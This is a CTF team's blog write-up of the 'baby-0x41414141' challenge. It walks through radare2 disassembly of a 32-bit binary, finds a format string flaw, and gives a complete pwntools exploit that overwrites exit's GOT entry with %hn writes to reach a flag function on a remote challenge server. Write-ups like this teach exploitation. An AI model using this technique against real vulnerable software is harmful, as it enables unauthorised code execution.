<!DOCTYPE html>
<html>
        <head>
                <meta charset="utf-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Crackchester - baby-0x41414141</title> 
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        </head>
        <body>
                <nav class="navbar navbar-inverse navbar-fixed top" style="border-radius:0px">
                        <div class="container">
                                <div class="navbar-header">
                                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                                                <span class="sr-only">Toggle navigation</span>
                                                <span class="icon-bar"></span>
                                                <span class="icon-bar"></span>
                                                <span class="icon-bar"></span>
                                        </button>
                                        <a href="/index.html" class="navbar-brand">Crackchester</a>
                                </div>
                                <div id="navbar" class="collapse navbar-collapse">
                                        <ul class="nav navbar-nav">
                                                <li ><a href="/index.html">About Us <span class="glyphicon glyphicon-book"></span></a></li>
                                                <li ><a href="/members.html">Members <span class="glyphicon glyphicon-user"></span></a></li>
                                                <li ><a href="/contact-us.html">Contact Us <span class="glyphicon glyphicon-envelope"></span></a></li>
                                                <li ><a href="/writeups.html">Writeups <span class="glyphicon glyphicon-align-left"></span></a></li>
                                        </ul>
                                        <ul class="nav navbar-nav navbar-right">
                                                <li><a href="https://github.com/Crackchester/">GitHub <span class="glyphicon glyphicon-download-alt"></span></a></li>
                                                <li><a href="https://ctftime.org/team/45182">CTFtime <span class="glyphicon glyphicon-flag"></span></a></li>
                                        </ul>
                                </div>
                        </div>
                </nav>
                <div class="container">
		<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">baby-0x41414141</h1>
    <p class="post-meta">
      <time datetime="2017-09-27T21:35:05+01:00" itemprop="datePublished">
      </time>
      
        • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">3553x</span></span>
      </p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>We download a file which is a 32bit ELF binary.</p>

<p>We take a look at it’s main function using radare2.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>/ (fcn) sym.main 214
|   sym.main ();
|           ; var int local_20ch @ ebp-0x20c
|           ; var int local_200h @ ebp-0x200
|           ; var int local_138h @ ebp-0x138
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x08048627 (entry0)
|           0x08048724      8d4c2404       lea ecx, [local_4h]         ; eflags
|           0x08048728      83e4f0         and esp, 0xfffffff0
|           0x0804872b      ff71fc         push dword [ecx - 4]
|           0x0804872e      55             push ebp
|           0x0804872f      89e5           mov ebp, esp
|           0x08048731      51             push ecx
|           0x08048732      81ec14020000   sub esp, 0x214
|           0x08048738      89c8           mov eax, ecx
|           0x0804873a      8b4004         mov eax, dword [eax + 4]    ; eflags ; [0x4:4]=0x10101
|           0x0804873d      8985f4fdffff   mov dword [local_20ch], eax
|           0x08048743      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x08048749      8945f4         mov dword [local_ch], eax
|           0x0804874c      31c0           xor eax, eax
|           0x0804874e      83ec0c         sub esp, 0xc
|           0x08048751      68f0880408     push str.Hello_baby_pwner__whats_your_name_ ; 0x80488f0 ; "Hello baby pwner, whats your name?" ; const char * s
|           0x08048756      e885feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804875b      83c410         add esp, 0x10
|           0x0804875e      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; " (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
|           0x08048763      83ec0c         sub esp, 0xc
|           0x08048766      50             push eax                    ; FILE *stream
|           0x08048767      e854feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x0804876c      83c410         add esp, 0x10
|           0x0804876f      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; "GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
|           0x08048774      bac8000000     mov edx, 0xc8
|           0x08048779      83ec04         sub esp, 4
|           0x0804877c      50             push eax
|           0x0804877d      52             push edx
|           0x0804877e      8d8500feffff   lea eax, [local_200h]
|           0x08048784      50             push eax                    ; char *s
|           0x08048785      e806feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0804878a      83c410         add esp, 0x10
|           0x0804878d      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; "GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
|           0x08048792      83ec0c         sub esp, 0xc
|           0x08048795      50             push eax                    ; FILE *stream
|           0x08048796      e825feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x0804879b      83c410         add esp, 0x10
|           0x0804879e      83ec04         sub esp, 4
|           0x080487a1      8d8500feffff   lea eax, [local_200h]
|           0x080487a7      50             push eax
|           0x080487a8      6814890408     push str.Ok_cool__soon_we_will_know_whether_you_pwned_it_or_not._Till_then_Bye__s ; 0x8048914 ; "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s"
|           0x080487ad      8d85c8feffff   lea eax, [local_138h]
|           0x080487b3      50             push eax                    ; char *s
|           0x080487b4      e897fdffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x080487b9      83c410         add esp, 0x10
|           0x080487bc      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; " (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
|           0x080487c1      83ec0c         sub esp, 0xc
|           0x080487c4      50             push eax                    ; FILE *stream
|           0x080487c5      e8f6fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x080487ca      83c410         add esp, 0x10
|           0x080487cd      83ec0c         sub esp, 0xc
|           0x080487d0      8d85c8feffff   lea eax, [local_138h]
|           0x080487d6      50             push eax                    ; const char * format
|           0x080487d7      e8f4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080487dc      83c410         add esp, 0x10
|           0x080487df      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; " (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
|           0x080487e4      83ec0c         sub esp, 0xc
|           0x080487e7      50             push eax                    ; FILE *stream
|           0x080487e8      e8d3fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x080487ed      83c410         add esp, 0x10
|           0x080487f0      83ec0c         sub esp, 0xc
|           0x080487f3      6a01           push 1                      ; int status
\           0x080487f5      e8f6fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre>
</div>

<p>A fairly simple program that’s vulnerable to a format string attack.</p>

<p>But we can’t overflow any buffers and there don’t appear to be any interesting variables on the stack. Overwriting the return address doesn’t make much sense since <code class="highlighter-rouge">main</code> calls <code class="highlighter-rouge">exit</code>. So what do we do?</p>

<p>We mess with the plt table!</p>

<p>Let’s look at <code class="highlighter-rouge">exit@plt</code> using <code class="highlighter-rouge">objdump</code>:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>080485f0 &lt;exit@plt&gt;:
 80485f0:       ff 25 34 a0 04 08       jmp    *0x804a034
 80485f6:       68 50 00 00 00          push   $0x50
 80485fb:       e9 40 ff ff ff          jmp    8048540 &lt;.plt&gt;
</code></pre>
</div>

<p>We can see that the process jumps to whatever address is stored at <code class="highlighter-rouge">0x804a034</code> when <code class="highlighter-rouge">exit</code> is called. We can abuse this to modify the flow of execution.</p>

<p>By skimming a bit through the output of objdump, we can actually find a function that outputs the flag:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>0804870b &lt;_Z4flagv&gt;:
 804870b:       55                      push   %ebp
 804870c:       89 e5                   mov    %esp,%ebp
 804870e:       83 ec 08                sub    $0x8,%esp
 8048711:       83 ec 0c                sub    $0xc,%esp
 8048714:       68 e0 88 04 08          push   $0x80488e0
 8048719:       e8 52 fe ff ff          call   8048570 &lt;system@plt&gt;
 804871e:       83 c4 10                add    $0x10,%esp
 8048721:       90                      nop
 8048722:       c9                      leave
 8048723:       c3                      ret
</code></pre>
</div>

<p>All we need to do is to redirect the execution to that function and we solved the challenge.</p>

<p>We can achieve this by pushing the address of the jump location(<code class="highlighter-rouge">0x804a034</code>) on the stack by passing it as part of an argument to <code class="highlighter-rouge">sprintf</code>. We then make sure that <code class="highlighter-rouge">sprintf</code> prints <code class="highlighter-rouge">0804870b</code> characters, before encountering <code class="highlighter-rouge">%n</code> in the passed string.</p>

<p>The desired jump location is a fairly big number, so we actually split it up into two writes in our exploit by using <code class="highlighter-rouge">%hn</code> and passing two addresses in the string.</p>

<p>We determined the right “parameter number” by using the following small shellscript:</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span>seq 1 100<span class="sb">`</span>;
<span class="k">do
        </span><span class="nb">echo</span> <span class="nv">$i</span>
        ./32_new <span class="o">&lt;&lt;&lt;</span> <span class="s2">"AAAA%</span><span class="nv">$i</span><span class="se">\$</span><span class="s2">p"</span>
        <span class="k">done</span>
</code></pre>
</div>
<p>All you need to do is to watch for <code class="highlighter-rouge">0x41414141</code> in the output.</p>

<p>And ended up with this solution:</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">target</span> <span class="o">=</span>  <span class="n">remote</span><span class="p">(</span><span class="s">'163.172.176.29'</span><span class="p">,</span> <span class="mi">9035</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"0804a034"</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"0804a036"</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">padding1</span> <span class="o">=</span> <span class="mh">0x870b</span>
<span class="n">padding2</span> <span class="o">=</span> <span class="mh">0x0804</span>

<span class="c"># sprintf already prints 70 characters</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">padding2</span> <span class="o">-</span> <span class="mi">78</span><span class="p">)</span> <span class="o">+</span> <span class="s">"x"</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%11</span><span class="s">$hn"</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">padding1</span> <span class="o">-</span> <span class="p">(</span><span class="n">padding2</span><span class="p">))</span> <span class="o">+</span> <span class="s">"x"</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%10</span><span class="s">$hn"</span>

<span class="n">payload</span><span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">payload2</span><span class="p">,</span> <span class="s">"ascii"</span><span class="p">)</span>

<span class="k">print</span><span class="p">((</span><span class="n">payload</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">target</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
</div>

<p>That’s it!</p>

  </div>

</article>

                </div>

                <!--Script section-->
                <script type="text/javascript"
                src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
                <script type="text/javascript"
                src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        </body>
</html>
